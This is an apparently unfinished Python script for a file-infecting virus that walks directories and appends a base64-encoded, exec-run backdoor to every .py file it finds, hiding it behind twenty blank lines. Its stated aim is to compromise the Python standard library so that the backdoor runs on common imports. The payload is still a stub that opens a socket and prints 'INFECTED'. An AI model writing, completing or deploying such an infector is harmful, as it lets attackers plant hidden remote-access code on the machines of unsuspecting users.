#!/usr/bin/env python3
from os import walk, environ
from sys import path
from glob import glob
from platform import system
from re import search
from base64 import b64encode, b64decode

# creating job that runs on startup on Windows
# https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/

class Infector:
    def __init__(self):
        self.SYSTEM:str = system()
        self.IP:str = "0.0.0.0"
        self.PORT:int = 1
        self.dont_target:tuple = (
            "socket.py",
            "subprocess.py",
            "os.py",
            "sys.py"
        )

    def infect_file(self, target_file:str):
        """Infects Python file with malicious Python code to create
        backdoor whenever the victim imports a commonly 
        utilized Python module
        """
        backdoor:bytes = b"import socket"
        backdoor += b"\nfrom subprocess import run"
        backdoor += b"\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:"
        backdoor += b"\n\tprint(\"INFECTED\")"
        backdoor_base64:bytes = b64encode(backdoor)
        payload = (
            "\n"*20 + "from base64 import b64decode;exec(b64decode('{}'))\n".format(backdoor_base64.decode())
        )
        with open(target_file, "a") as f:
            f.write(payload)

    def start_infecting(self):
        """Begin scanning for Python files and infect each one"""
        # for testing 
        directory:str = "./samples"
        #-------------------------------
        #directory:str = self.python_dir
        #-------------------------------
        for root, _, _ in walk(directory):
            divider:str = "/" if self.SYSTEM == "Linux" else "\\"
            for file_ in glob(root+divider+"*.py"):
                if file_ == root+divider+__file__: continue
                self.infect_file(file_) 
        
    def get_python_dir(self):
        """Get default Python directory"""
        pattern:str = "\d{2}-\d{2}$" if self.SYSTEM == "Windows" else "\d\.\d$"
        for p in path:
            if search(pattern, p):
               self.python_dir:str = p
        # REMEMBER TO MODIFY THIS TO RETURN A LIST WITH ALL VALID MATCHES
        # BECAUSE THERE COULD BE OTHER PYTHON VERSIONS INSTALLED 

def main():
    infector = Infector()
    infector.get_python_dir()
    infector.start_infecting() 
    
if __name__ == "__main__":
    main()
